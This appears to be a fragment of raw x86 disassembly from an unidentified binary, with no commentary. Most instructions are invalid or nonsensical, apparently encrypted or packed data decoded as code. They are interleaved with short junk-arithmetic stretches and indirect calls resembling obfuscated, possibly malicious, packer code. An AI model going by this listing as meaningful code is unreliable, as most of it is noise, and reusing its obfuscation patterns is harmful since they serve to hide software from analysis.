  417e07:	fidiv  DWORD PTR [esi+eax*2+0x34]
  417e0b:	mov    ch,0x7d
  417e0d:	enter  0xa121,0xbc
  417e11:	jmp    0xb8442bb9
  417e16:	fnstcw WORD PTR ss:[esi-0x4e]
  417e1a:	pop    DWORD PTR [esp+edx*4]
  417e1d:	imul   eax,esi,0x7a803147
  417e23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417e24:	sub    BYTE PTR [ecx-0x28423d36],al
  417e2a:	dec    ecx
  417e2b:	test   BYTE PTR [ebx],ah
  417e2d:	test   eax,0xcb6c1f49
  417e32:	mov    WORD PTR [edx],es
  417e34:	mov    esp,0xe47f3391
  417e39:	test   BYTE PTR [eax-0x5],ch
  417e3c:	dec    esi
  417e3d:	jmp    0x1aeb9b0
  417e42:	and    dh,dl
  417e44:	outs   dx,BYTE PTR ds:[esi]
  417e45:	add    eax,0x7e1cff5a
  417e4a:	das    
  417e4b:	pop    eax
  417e4c:	nop
  417e4d:	ds push esp
  417e4f:	outs   dx,BYTE PTR ds:[esi]
  417e50:	jbe    0x417e7a
  417e52:	leave  
  417e53:	adc    eax,0x11761c18
  417e58:	jg     0x417e59
  417e5a:	popa   
  417e5b:	add    bl,ah
  417e5d:	dec    edx
  417e5e:	pop    ecx
  417e5f:	aam    0x19
  417e61:	inc    esi
  417e62:	fwait
  417e63:	jne    0x417eca
  417e65:	dec    ebp
  417e66:	inc    eax
  417e67:	push   edx
  417e68:	push   0x64
  417e6a:	test   al,0x93
  417e6c:	mov    DWORD PTR [eax+0x30],edi
  417e6f:	mov    bh,0x43
  417e71:	data16 icebp 
  417e73:	push   esi
  417e74:	js     0x417e39
  417e76:	scas   eax,DWORD PTR es:[edi]
  417e77:	dec    esi
  417e78:	xchg   ecx,eax
  417e79:	mov    ?,WORD PTR [eax]
  417e7b:	pop    edi
  417e7c:	jmp    0x417ec1
  417e7e:	lahf   
  417e7f:	mov    ebp,0xd650556c
  417e84:	push   esi
  417e85:	and    dl,BYTE PTR [eax+0x5af7eed3]
  417e8b:	adc    edi,ebp
  417e8d:	lds    esi,FWORD PTR [edx]
  417e8f:	popf   
  417e90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417e91:	in     al,dx
  417e92:	mov    dh,0xa9
  417e94:	xor    eax,0xf7bd1757
  417e99:	adc    DWORD PTR [ecx],ebp
  417e9b:	pop    es
  417e9c:	inc    esp
  417e9d:	inc    ecx
  417e9e:	xchg   edx,eax
  417e9f:	fild   DWORD PTR ds:0xd81ecf91
  417ea5:	fwait
  417ea6:	jae    0x417e76
  417ea8:	cmc    
  417ea9:	sub    ebp,edx
  417eab:	test   eax,0x1834152b
  417eb0:	fadd   QWORD PTR [ecx+0x3c2444c7]
  417eb6:	aad    0x63
  417eb8:	add    BYTE PTR [eax],al
  417eba:	mov    DWORD PTR ds:0x42834f,0x432b
  417ec4:	mov    DWORD PTR [esp+0x30],0x169
  417ecc:	mov    DWORD PTR [esp+0x28],0x101b
  417ed4:	mov    DWORD PTR [esp+0x10],0x6bec
  417edc:	mov    eax,DWORD PTR [esp+0x10]
  417ee0:	mov    ecx,DWORD PTR [esp+0x28]
  417ee4:	sub    DWORD PTR ds:0x428213,0x42826b
  417eee:	imul   eax,ecx
  417ef1:	or     eax,0x7f7d
  417ef6:	xor    eax,0xcf336131
  417efb:	cmp    DWORD PTR ds:0x428363,0x0
  417f02:	mov    ecx,0x3c6
  417f07:	mov    ecx,0x355d
  417f0c:	mov    ecx,0x21c7
  417f11:	jmp    0x41834c
  417f16:	mov    DWORD PTR ds:0x42825f,0x1cb6
  417f20:	mov    DWORD PTR ds:0x42835b,0x6ca2
  417f2a:	cmp    DWORD PTR ds:0x428363,0x0
  417f31:	jge    0x417f5f
  417f37:	push   DWORD PTR [ebp-0x1c]
  417f3a:	push   DWORD PTR [ebp-0x10]
  417f3d:	call   DWORD PTR ds:0x428e68
  417f43:	sub    DWORD PTR ds:0x428237,0x19df
  417f4d:	xor    ecx,DWORD PTR ds:0x42821b
  417f53:	mov    ecx,DWORD PTR ds:0x42827b
  417f59:	and    DWORD PTR ds:0x428177,ecx
  417f5f:	xor    ecx,DWORD PTR ds:0x428353
  417f65:	mov    ecx,DWORD PTR ds:0x428167
  417f6b:	or     DWORD PTR ds:0x4282fb,ecx
  417f71:	mov    ecx,DWORD PTR ds:0x42837f
  417f77:	or     DWORD PTR ds:0x428267,ecx
  417f7d:	jmp    0x41834c
  417f82:	jp     0x417fbc
  417f84:	lock adc al,0x9b
  417f87:	dec    esp
  417f88:	pop    edx
  417f89:	push   ds
  417f8a:	dec    esp
  417f8b:	retf   
  417f8c:	repnz push 0xffffffc2
  417f8f:	aaa    
  417f90:	lea    esi,[eax+0x53]
  417f93:	fst    DWORD PTR [esi]
  417f95:	sbb    BYTE PTR [edx+edx*1+0x69161818],bh
  417f9c:	fld    TBYTE PTR [esi]
  417f9e:	jnp    0x417f2d
  417fa0:	(bad)  
  417fa1:	addr16 daa 
  417fa3:	and    al,0x73
  417fa5:	es pop ebp
  417fa7:	add    eax,0x370df919
  417fac:	pop    esi
  417fad:	cdq    
  417fae:	adc    edi,0x69
  417fb1:	dec    BYTE PTR [ebp-0x48]
  417fb4:	nop
  417fb5:	sar    DWORD PTR [ebx-0x1f],0xbb
  417fb9:	dec    edx
  417fba:	jmp    0xeb47:0x7c6e9326
  417fc1:	pop    esp
  417fc2:	adc    ecx,edx
  417fc4:	push   ebx
  417fc5:	clc    
  417fc6:	imul   esi,DWORD PTR [ebx+0x2c],0x5f
  417fca:	es (bad) 
  417fcd:	push   ebx
  417fcf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417fd0:	xchg   esp,eax
  417fd1:	pop    ebx
  417fd2:	imul   ebx
  417fd4:	add    ebp,DWORD PTR [ebx-0x64]
  417fd7:	cmp    al,BYTE PTR [ecx+0x1a]
  417fda:	test   BYTE PTR [edx-0x53],dl
  417fdd:	inc    eax
  417fde:	(bad)  
  417fdf:	mov    BYTE PTR [edx+0x446cfc95],al
  417fe5:	stos   DWORD PTR es:[edi],eax
  417fe6:	mov    ch,0x3
  417fe8:	and    bh,al
  417fea:	rcl    ebp,cl
  417fec:	dec    eax
  417fed:	dec    ebx
  417fee:	push   edi
  417fef:	mov    bl,BYTE PTR gs:[esi]
  417ff2:	stc    
  417ff3:	sbb    bh,0x52
  417ff6:	loope  0x418036
  417ff8:	sub    BYTE PTR [ebx+0x7ec80ebd],dh
  417ffe:	jo     0x417fd6
  418000:	stos   DWORD PTR es:[edi],eax
  418001:	ret    0x3e5c
  418004:	stc    
  418005:	inc    ecx
  418006:	shl    DWORD PTR [ebx-0x20],1
  418009:	paddw  mm0,QWORD PTR [ecx+0x71bb53ae]
  418010:	dec    edx
  418011:	fisubr WORD PTR [esi+0x77]
  418015:	xchg   ecx,eax
  418016:	push   ecx
  418017:	ficomp DWORD PTR [edi+0xe6f6e92]
  41801d:	xor    al,0x4
  41801f:	inc    edi
  418020:	inc    ebp
  418021:	imul   ebp,DWORD PTR [eax+0x70],0x35
  418025:	scas   al,BYTE PTR es:[edi]
  418026:	mov    ds:0x92452fa0,eax
  41802b:	popf   
  41802c:	xchg   ebx,eax
  41802d:	xor    eax,0x4a055569
  418032:	add    bl,BYTE PTR [ecx]
  418034:	mov    bh,0x65
  418036:	push   es
  418037:	mov    edx,0x211c9f3b
  41803c:	int3   
  41803d:	sub    BYTE PTR [edx+ebp*2+0x3534d593],ah
  418044:	out    dx,al
  418045:	dec    edx
  418046:	jp     0x417ff3
  418048:	test   al,0x5d
  41804a:	fs sub dh,cl
  41804d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41804e:	out    dx,al
  41804f:	sbb    DWORD PTR [ecx],ebx
  418051:	cmp    DWORD PTR [edi-0x5eea7b00],ebx
  418057:	clc    
  418058:	sbb    al,0x7e
  41805a:	test   al,0xc9
  41805c:	das    
  41805d:	dec    ebx
  41805e:	lods   al,BYTE PTR ds:[esi]
  41805f:	shr    BYTE PTR [edx-0x69],1
  418062:	mov    eax,es
  418064:	data16 jle 0x41802e
  418067:	adc    esi,DWORD PTR [edx-0x6f]
  41806a:	test   DWORD PTR [eax-0x1804b151],ecx
  418070:	mov    esp,0x54a6c312
  418075:	sahf   
  418076:	pop    es
  418077:	inc    ebx
  418078:	mov    BYTE PTR [ecx+0x4d],al
  41807b:	xor    DWORD PTR [ecx],esi
  41807d:	xchg   ecx,eax
  41807e:	lock mov edx,es
  418081:	or     bl,BYTE PTR [ebx+0x2a]
  418084:	sub    BYTE PTR [ecx-0x40c600d2],cl
  41808a:	lock xor eax,0xd1c551c8
  418090:	(bad)  
  418091:	out    0x7c,al
  418093:	stc    
  418094:	test   al,0x2d
  418096:	xor    ecx,DWORD PTR [ebp-0x3b]
  418099:	adc    DWORD PTR [eax-0x3f],0xf357d80c
  4180a0:	dec    esp
  4180a1:	rol    DWORD PTR ds:0x9d5550fc,cl
  4180a7:	xor    DWORD PTR [ebp-0x19ad2777],edx
  4180ad:	retf   
  4180ae:	loop   0x41806b
  4180b0:	dec    ecx
  4180b1:	add    ch,BYTE PTR [eax+0x45]
  4180b4:	call   0x4f016d32
  4180b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4180ba:	dec    edx
  4180bb:	jg     0x4180e2
  4180bd:	jp     0x4180c9
  4180bf:	scas   al,BYTE PTR es:[edi]
  4180c0:	sti    
  4180c1:	dec    edi
  4180c2:	inc    esp
  4180c3:	test   eax,0xc3e0fcd5
  4180c8:	mov    ch,0xb7
  4180ca:	sbb    edi,DWORD PTR [eax-0x41]
  4180cd:	mov    edi,0x24217ff9
  4180d2:	inc    edx
  4180d3:	daa    
  4180d4:	repz sub dh,ah
  4180d7:	pusha  
  4180d8:	iret   
  4180d9:	ret    0x5f4a
  4180dc:	and    ebx,esp
  4180de:	in     al,0xf9
  4180e0:	lods   al,BYTE PTR ds:[esi]
  4180e1:	dec    edi
  4180e2:	sub    DWORD PTR [ebx],esi
  4180e4:	loop   0x4180d5
  4180e6:	fwait
  4180e7:	jmp    0x6a06:0x23109b68
  4180ee:	jne    0x4180e1
  4180f0:	mov    esp,0x38e47b0f
  4180f5:	ins    BYTE PTR es:[edi],dx
  4180f6:	mov    al,ds:0xc19ba82e
  4180fb:	cs mov ebx,0xc0f987a
  418101:	mov    esi,0x98df3533
  418106:	mov    ch,0xe0
  418108:	and    BYTE PTR [esi+0x1f],al
  41810b:	ret    0xbb26
  41810e:	xor    edx,ebp
  418110:	inc    ecx
  418111:	add    BYTE PTR [ebx-0x46],bl
  418114:	into   
  418115:	lea    edi,[ebp+0x36cb90ef]
  41811b:	jl     0x4180a8
  41811d:	lock inc esp
  41811f:	jge    0x4180f9
  418121:	push   0x53
  418123:	loope  0x41810b
  418125:	xchg   ebx,eax
  418126:	iret   
  418127:	(bad)  
  418128:	(bad)  
  418129:	xchg   ebp,eax
  41812a:	retf   0x1de0
  41812d:	sbb    al,bh
  41812f:	pop    es
  418130:	xlat   BYTE PTR ds:[ebx]
  418131:	jae    0x41818d
  418133:	(bad)  
  418134:	sahf   
  418135:	ds push 0xeeea7c37
  41813b:	popa   
  41813c:	mov    BYTE PTR [ecx-0x30],bh
  41813f:	pop    esi
  418140:	cmp    al,0x28
  418142:	int    0x67
  418144:	mov    bl,0x16
  418146:	xchg   esp,eax
  418147:	add    eax,0x43b67788
  41814c:	bound  edx,QWORD PTR ds:0x25b57735
  418152:	ficom  WORD PTR [ecx+0x3e]
  418155:	lods   al,BYTE PTR ds:[esi]
  418156:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418157:	mov    ch,0xcf
  418159:	mov    esp,0x5a0af537
  41815e:	ins    DWORD PTR es:[edi],dx
  41815f:	sub    DWORD PTR [edi+ecx*4+0x8892c38],edi
  418166:	fs push ebp
  418168:	in     eax,dx
  418169:	add    edx,DWORD PTR [eax]
  41816b:	xchg   edx,eax
  41816c:	or     ah,dh
  41816e:	stos   BYTE PTR es:[edi],al
  41816f:	push   ecx
  418170:	sub    eax,0x555f868a
  418175:	outs   dx,DWORD PTR ds:[esi]
  418176:	aaa    
  418177:	jo     0x418190
  418179:	cmp    BYTE PTR [edx-0x20],cl
  41817c:	mov    eax,0x3ce77b91
  418181:	xchg   esi,eax
  418182:	pusha  
  418183:	pushf  
  418184:	mov    eax,0x8a4c6b53
  418189:	adc    eax,0xca4f19c9
  41818e:	mov    cl,0x9d
  418190:	addr16 adc eax,0xb722d913
  418196:	cvtps2pd xmm7,QWORD PTR [eax]
  418199:	push   cs
  41819a:	sub    al,0x92
  41819c:	pop    esi
  41819d:	push   esi
  41819e:	fld    TBYTE PTR [esi+eax*4-0x5d]
  4181a2:	data16 mov ah,0x31
  4181a5:	loopne 0x418128
  4181a7:	inc    esi
  4181a8:	xlat   BYTE PTR ds:[ebx]
  4181a9:	ret    0xb864
  4181ac:	pop    es
  4181ad:	mov    al,ds:0x24dbe11a
  4181b2:	retf   
  4181b3:	fld    DWORD PTR [esi]
  4181b5:	mov    bh,0x8a
  4181b7:	jge    0x4181d2
  4181b9:	mov    ch,0x4c
  4181bb:	and    BYTE PTR [ebx+0x6daa076a],bh
  4181c1:	push   eax
  4181c2:	(bad)  
  4181c3:	hlt    
  4181c4:	xchg   esi,eax
  4181c5:	mov    ds:0xd74a5d0b,al
  4181ca:	push   ecx
  4181cb:	dec    esp
  4181cc:	mov    dl,0xef
  4181ce:	lods   al,BYTE PTR ds:[esi]
  4181cf:	lods   al,BYTE PTR ds:[esi]
  4181d0:	and    eax,0xa95c9f62
  4181d5:	retf   0x3010
  4181d8:	push   edx
  4181d9:	mov    cl,ah
  4181db:	xor    eax,0xa625af17
  4181e0:	add    BYTE PTR [eax],0x3b
  4181e3:	iret   
  4181e4:	and    al,0x22
  4181e6:	mov    al,ds:0x3c0c6053
  4181eb:	jb     0x418258
  4181ed:	xor    cl,ah
  4181ef:	dec    esi
  4181f0:	and    BYTE PTR [esi],dh
  4181f2:	add    eax,0x8f055276
  4181f7:	(bad)  
  4181f8:	mov    eax,0x2c270d6
  4181fd:	popf   
  4181fe:	(bad)  
  418200:	adc    bl,BYTE PTR [eax]
  418202:	push   ds
  418203:	push   ds
  418204:	dec    esp
  418205:	cs (bad) 
  418207:	out    0x5a,al
  418209:	adc    eax,0x3463cd1a
  41820e:	daa    
  41820f:	loope  0x4181d2
  418211:	add    BYTE PTR [edx+0x7b],ah
  418214:	gs inc esp
  418216:	or     dh,cl
  418218:	outs   dx,DWORD PTR ds:[esi]
  418219:	adc    esi,ebp
  41821b:	dec    esp
  41821c:	xor    esi,esp
  41821e:	call   0xc8a5:0x6ba04e1e
  418225:	leave  
  418226:	pop    ecx
  418227:	mov    WORD PTR [edx+0xd],es
  41822a:	icebp  
  41822b:	mov    ebx,0x4319173
  418230:	sbb    ecx,edi
  418232:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418233:	add    edi,esp
  418235:	leave  
  418236:	rcr    BYTE PTR [ebx+0x5a],1
  418239:	sub    eax,0xd0e2788f
  41823e:	mov    eax,0xd405f02f
  418243:	jge    0x41823a
  418245:	push   esp
  418246:	popa   
  418247:	cmp    eax,0x9606ee69
  41824c:	sub    eax,0x361aca29
  418251:	and    dh,BYTE PTR [esi+eax*8+0x2f]
  418255:	lock jns 0x418272
  418258:	mov    edx,0xbb2c50e
  41825d:	mov    edx,0x65c38944
  418262:	push   esp
  418263:	sub    eax,0x7ca51742
  418268:	arpl   WORD PTR [ecx-0xb6a8b39],ax
  41826e:	sub    ch,BYTE PTR [ecx-0x290b73c7]
  418274:	sub    ebx,DWORD PTR [ebx-0x5c]
  418277:	push   edi
  418278:	loope  0x41828a
  41827a:	adc    al,0xa
  41827c:	inc    ecx
  41827d:	sub    DWORD PTR [ecx+0x4c3a55af],ecx
  418283:	icebp  
  418284:	lds    ebp,FWORD PTR [edx-0x3e8842d2]
  41828a:	mov    dl,0x37
  41828c:	les    edx,FWORD PTR [ebp+0x24f1e84a]
  418292:	out    dx,al
  418293:	inc    ecx
  418294:	add    BYTE PTR [eax+0x10091114],ah
  41829a:	out    0x5b,al
  41829c:	(bad)  
  41829d:	out    dx,al
  41829e:	or     BYTE PTR [eax-0x218a29a8],ch
  4182a4:	in     al,dx
  4182a5:	iret   
  4182a6:	xchg   BYTE PTR [edi+eiz*4+0x4461aa5],ah
  4182ad:	std    
  4182ae:	outs   dx,BYTE PTR ds:[esi]
  4182af:	xchg   ebp,eax
  4182b0:	push   ss
  4182b1:	test   BYTE PTR [ebx-0x6a2de6d9],dh
  4182b7:	(bad)  
  4182b8:	jle    0x4182dd
  4182ba:	lock jp 0x41827a
  4182bd:	imul   edi,DWORD PTR [esi],0xffffff97
  4182c0:	ficomp WORD PTR [ecx]
  4182c2:	xchg   ecx,eax
  4182c3:	adc    ecx,DWORD PTR [eax]
  4182c5:	cmp    al,0x37
  4182c7:	pop    esp
  4182c8:	add    DWORD PTR [ebx+0x61],esi
  4182cb:	inc    edi
  4182cc:	xchg   edx,eax
  4182cd:	dec    edi
  4182ce:	mov    ecx,ebp
  4182d0:	lods   al,BYTE PTR ss:[esi]
  4182d2:	or     al,0x24
  4182d4:	push   eax
  4182d5:	repz je 0x4182dc
  4182d8:	out    dx,eax
  4182d9:	adc    bh,BYTE PTR [esi+0x3a]
  4182dc:	repnz push es
  4182de:	push   0xffffffee
  4182e0:	fldenv [ecx-0x3332ed4]
  4182e6:	adc    ecx,DWORD PTR [edi]
  4182e8:	dec    ecx
  4182e9:	int    0xe7
  4182eb:	jmp    0x63bd:0xc320f32c
  4182f2:	mov    ebp,0xa8d510bd
  4182f7:	mov    dl,BYTE PTR [ecx-0x16667578]
  4182fd:	xchg   ecx,eax
  4182fe:	mov    bl,0xe1
  418300:	mov    bh,0xae
  418302:	mov    dh,0x96
  418304:	repz out dx,al
  418306:	push   ss
  418307:	xchg   ebx,eax
  418308:	dec    edx
  418309:	or     al,0x4c
  41830b:	mov    ebx,0xb8869400
  418310:	ror    BYTE PTR [esp+edi*4],1
  418313:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418314:	test   al,0x14
  418316:	sbb    BYTE PTR [eax],dh
  418318:	mov    ch,0x94
  41831a:	mov    cl,BYTE PTR [ebp+0xdc25a14]
  418320:	mov    ah,bl
  418322:	sar    BYTE PTR [ecx-0x27e6710e],cl
  418328:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418329:	mov    ds:0x7f185c4d,eax
  41832e:	xchg   ebp,eax
  41832f:	mov    ebp,0x8521ff68
  418334:	mov    ds:0xac4fff11,eax
  418339:	sbb    esp,DWORD PTR [ebx+0x251268b5]
  41833f:	push   cs
  418340:	in     al,0xb3
  418342:	mov    edi,0xad1bba0
  418347:	inc    esp
  418348:	ror    DWORD PTR [ebp+0x30ff1ec7],1
  41834e:	mov    eax,DWORD PTR [esp+0x34]
  418352:	cmp    DWORD PTR ds:0x428167,0x0
  418359:	mov    DWORD PTR ds:0x42822b,0x42c6
  418363:	mov    DWORD PTR ds:0x428367,edx
  418369:	mov    DWORD PTR ds:0x428143,0x1d0
  418373:	jmp    0x4183cc
  418378:	mov    DWORD PTR ds:0x428267,0x243f
  418382:	mov    DWORD PTR ds:0x42823f,0x6875
  41838c:	cmp    DWORD PTR ds:0x428167,0x0
  418393:	ja     0x4183ba
  418399:	push   0x36f9
  41839e:	push   0x428303
  4183a3:	push   0x488c
  4183a8:	call   DWORD PTR ds:0x428e6c
  4183ae:	add    DWORD PTR ds:0x4282cf,ecx
  4183b4:	add    ecx,DWORD PTR ds:0x428253
  4183ba:	xor    DWORD PTR ds:0x428307,edx
  4183c0:	mov    ecx,DWORD PTR ds:0x4282e3
  4183c6:	or     DWORD PTR ds:0x42815f,ecx
  4183cc:	add    eax,0x75d9
  4183d1:	xor    DWORD PTR ds:0x42820b,ebx
  4183d7:	push   0xd
  4183d9:	not    ecx
  4183db:	pop    ecx
  4183dc:	xor    edx,edx
  4183de:	div    ecx
  4183e0:	mov    ecx,DWORD PTR [esp+0x40]
  4183e4:	xor    edx,edx
  4183e6:	xor    DWORD PTR ds:0x42820f,0x42817b
  4183f0:	or     eax,ecx
  4183f2:	mov    ecx,DWORD PTR [esp+0x44]
  4183f6:	xor    DWORD PTR ds:0x42816f,0x28c0
  418400:	or     eax,ecx
  418402:	movzx  ecx,WORD PTR ds:0x42836f
  418409:	or     DWORD PTR ds:0x428367,ecx
  41840f:	mov    ecx,DWORD PTR [esp+0x9c]
  418416:	sub    DWORD PTR ds:0x42813f,0x428307
  418420:	div    ecx
  418422:	xor    edx,edx
  418424:	xor    eax,0x680da048
  418429:	cmp    DWORD PTR ds:0x42820b,0x0
  418430:	mov    DWORD PTR ds:0x42821b,0x43af
  41843a:	mov    ecx,0x1f20
  41843f:	jmp    0x418491
  418444:	mov    DWORD PTR ds:0x428363,0x5a59
  41844e:	cmp    DWORD PTR ds:0x42820b,0x0
  418455:	jl     0x41847f
  41845b:	push   0x428063
  418460:	push   0x400000
  418465:	call   DWORD PTR ds:0x428dc8
  41846b:	sbb    DWORD PTR ds:0x42824f,0x4c8f
  418475:	mov    DWORD PTR ds:0x428147,0x386a
  41847f:	or     ecx,DWORD PTR ds:0x428363
  418485:	xor    ecx,DWORD PTR ds:0x4282cb
  41848b:	or     ecx,0x6bea
  418491:	push   DWORD PTR [eax]
  418493:	mov    eax,DWORD PTR [esp+0x94]
  41849a:	or     DWORD PTR ds:0x428367,ecx
  4184a0:	mov    ecx,DWORD PTR [esp+0x5c]
  4184a4:	xor    DWORD PTR ds:0x4282df,0x42824b
  4184ae:	push   DWORD PTR ds:0x4facd31
  4184b4:	add    eax,0xb4a
  4184b9:	and    DWORD PTR ds:0x428387,0x42820f
  4184c3:	push   DWORD PTR ds:0x1e6ebff7
  4184c9:	or     DWORD PTR ds:0x4282db,0x5053
  4184d3:	imul   eax,ecx
  4184d6:	push   DWORD PTR [eax-0x3f17647c]
  4184dc:	mov    eax,DWORD PTR [esp+0x60]
  4184e0:	adc    ecx,0x139f
  4184e6:	jmp    0x4188b5
  4184eb:	and    eax,0x8fa5979d
  4184f0:	sbb    esp,DWORD PTR [ebx]
  4184f2:	sbb    eax,0x7edf00c8
  4184f7:	sbb    al,0xd7
  4184f9:	add    ch,BYTE PTR [edx-0xa]
  4184fc:	rcl    DWORD PTR [esi],1
  4184fe:	sbb    BYTE PTR [edx+edx*1-0x1890e7e8],bh
  418505:	lds    ebp,FWORD PTR [eax]
  418507:	and    BYTE PTR [edi-0x30],dl
  41850a:	leave  
  41850b:	mov    eax,0x69ae16b2
  418510:	xor    eax,0xf7ddc411
  418515:	mov    ds:0xba468c5b,al
  41851a:	xchg   BYTE PTR [esi],dh
  41851c:	repz addr16 popa 
  41851f:	fs fs leave 
  418522:	mov    cl,dh
  418524:	nop
  418525:	loope  0x418589
  418527:	icebp  
  418528:	lock push 0xffffffa0
  41852b:	xchg   esp,eax
  41852c:	iret   
  41852d:	sbb    eax,0x9739312b
  418532:	pop    ss
  418533:	cdq    
  418534:	xchg   esi,eax
  418535:	test   DWORD PTR [edx],0x4c87daba
  41853b:	or     eax,0x98bca070
  418540:	jno    0x418593
  418542:	sbb    eax,0x50b57dee
  418547:	or     eax,0x6efb6ad1
  41854c:	jnp    0x4184e5
  41854e:	mov    al,0xa6
  418550:	iret   
  418551:	and    eax,edi
  418553:	add    DWORD PTR [edi-0x5dff84ee],ecx
  418559:	pop    ds
  41855a:	dec    esi
  41855b:	(bad)  
  41855c:	jmp    0x418572
  41855e:	mov    BYTE PTR [edi-0x48],dh
  418561:	arpl   WORD PTR [ebp+ecx*1+0x55],dx
  418565:	jb     0x418509
  418567:	aam    0x27
  418569:	dec    ebx
  41856a:	dec    DWORD PTR [edx]
  41856c:	rcr    BYTE PTR [ecx+esi*4],cl
  41856f:	push   esi
  418570:	mov    DWORD PTR ds:0x6c3889b9,esi
  418576:	dec    ebx
  418577:	sub    edx,DWORD PTR [ebx]
  418579:	addr16 pop esp
  41857b:	dec    edx
  41857c:	leave  
  41857d:	loop   0x41850b
  41857f:	in     eax,dx
  418580:	jecxz  0x4185fc
  418582:	mov    dh,0xed
  418584:	ja     0x41856c
  418586:	adc    eax,0xbfefa442
  41858b:	push   eax
  41858c:	lds    esp,FWORD PTR [ecx]
  41858e:	sbb    DWORD PTR [edx],eax
  418590:	mov    al,0x30
  418592:	bsf    ebp,DWORD PTR [ecx+edi*8]
  418596:	in     eax,0x99
  418598:	push   ecx
  418599:	mov    eax,ds:0x9abac8c2
  41859e:	sti    
  41859f:	aas    
  4185a0:	ret    0x11e3
  4185a3:	in     ax,0x32
  4185a6:	sub    WORD PTR [eax+esi*8-0x162faf47],bx
  4185ae:	jb     0x41859c
  4185b0:	je     0x4185bb
  4185b2:	jae    0x4185d9
  4185b4:	and    eax,0x2c366487
  4185b9:	pop    ds
  4185ba:	jns    0x418570
  4185bc:	sub    eax,DWORD PTR [edi+0x0]
  4185bf:	inc    eax
  4185c0:	cld    
  4185c1:	mov    ds:0xb75ac40e,eax
  4185c6:	add    BYTE PTR [esi],al
  4185c8:	std    
  4185c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4185ca:	jb     0x4185a8
  4185cc:	sbb    BYTE PTR [edi],0x98
  4185cf:	into   
  4185d0:	std    
  4185d1:	sbb    edx,ebp
  4185d3:	fisttp WORD PTR [ebx+0x14]
  4185d6:	(bad)  
  4185d8:	sbb    ch,BYTE PTR [edx+0x6d]
  4185db:	sbb    dh,BYTE PTR [edi+0x1c7faea5]
  4185e1:	xor    al,0x1c
  4185e3:	push   edx
  4185e4:	imul   eax,DWORD PTR [ebx],0xc32c4f64
  4185ea:	sti    
  4185eb:	cwde   
  4185ec:	ret    
  4185ed:	jb     0x41856f
  4185ef:	cmp    eax,0x4d993981
  4185f4:	jbe    0x418614
  4185f6:	add    ch,BYTE PTR [edi+0x46bbc988]
  4185fc:	pop    ebx
  4185fd:	(bad)  
  4185fe:	out    dx,eax
  4185ff:	push   esp
  418600:	jg     0x4185a1
  418602:	aam    0x63
  418604:	mov    edx,0xd0819af1
  418609:	pop    eax
  41860a:	dec    edx
  41860b:	jns    0x418633
  41860d:	retf   
  41860e:	push   edi
  41860f:	out    dx,al
  418610:	xor    eax,0x3b2dd594
  418615:	inc    ecx
  418616:	inc    esp
  418617:	pop    ebp
  418618:	sub    DWORD PTR [esi+esi*1-0x68],esp
  41861c:	mov    dl,0xe0
  41861e:	jmp    0x5a98a499
  418623:	mov    bl,0xb1
  418625:	not    BYTE PTR cs:[ebx-0x43]
  418629:	fadd   st(2),st
  41862b:	push   eax
  41862c:	ret    
  41862d:	sbb    ch,BYTE PTR [edx+edi*1+0x61d02959]
  418634:	into   
  418635:	push   eax
  418636:	inc    edi
  418637:	(bad)  
  418638:	rol    BYTE PTR [ebx],0xdc
  41863b:	mov    eax,0xf5f45024
  418640:	scas   al,BYTE PTR es:[edi]
  418641:	push   esi
  418642:	adc    al,0xd9
  418644:	jl     0x418665
  418646:	cmp    al,0x44
  418648:	pop    DWORD PTR [edx+0x48a351af]
  41864e:	loop   0x4185fe
  418650:	in     al,0x6c
  418652:	pop    edi
  418653:	in     eax,0x27
  418655:	fidiv  DWORD PTR [ebp+0x75c43c95]
  41865b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41865c:	jecxz  0x4186a3
  41865e:	add    al,0x64
  418660:	mov    ds:0x2bd78e10,al
  418665:	mov    bl,ch
  418667:	cmp    al,0x2f
  418669:	sbb    al,0xee
  41866b:	pop    ss
  41866c:	std    
  41866d:	push   esi
  41866e:	inc    esp
  41866f:	iret   
  418670:	adc    DWORD PTR [esp+edi*1+0x77da6971],0xf4c70750
  41867b:	repnz push 0x91ac3172
  418681:	inc    esp
  418682:	stc    
  418683:	xchg   esi,eax
  418684:	adc    DWORD PTR [ebx],0x6c
  418687:	(bad)  
  418689:	pop    es
  41868a:	cdq    
  41868b:	jl     0x4186df
  41868d:	out    dx,al
  41868e:	mov    eax,0x460b61fa
  418693:	mov    bl,BYTE PTR [ecx-0x654ea1db]
  418699:	mov    esi,0xdb24bda6
  41869e:	inc    edx
  41869f:	loopne 0x418695
  4186a1:	mov    edi,0xebc93537
  4186a6:	adc    eax,0xa0ff195f
  4186ab:	lock retf 0xd1de
  4186af:	sbb    eax,0xc29609c4
  4186b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4186b5:	push   eax
  4186b6:	popa   
  4186b7:	sub    BYTE PTR [ebp-0xac23d],dh
  4186bd:	mov    edx,0x80b5a3c2
  4186c2:	and    cl,BYTE PTR [edi+edi*8+0x11]
  4186c6:	inc    eax
  4186c7:	jns    0x4186e0
  4186c9:	dec    ecx
  4186ca:	gs aad 0x71
  4186cd:	cmc    
  4186ce:	dec    ebx
  4186cf:	aaa    
  4186d0:	mov    ecx,0xb76a214b
  4186d5:	imul   esp,DWORD PTR [esi-0x1abaee4c],0xffffffad
  4186dc:	sbb    eax,0x3abbe199
  4186e1:	pop    ebx
  4186e2:	mov    ch,0xf3
  4186e4:	rcl    BYTE PTR [edi+0x1d],0xe1
  4186e8:	ror    DWORD PTR ds:0x6de6b3db,1
  4186ee:	shl    BYTE PTR [ecx],1
  4186f0:	sub    ecx,edx
  4186f2:	jae    0x41874f
  4186f4:	cmc    
  4186f5:	enter  0xcb00,0x5e
  4186f9:	adc    eax,0xc4c66194
  4186fe:	ss std 
  418700:	enter  0xc392,0xf
  418704:	cs push ebx
  418706:	imul   edx,edi,0x42
  418709:	clc    
  41870a:	into   
  41870b:	mov    edx,0x5b40b479
  418710:	dec    esp
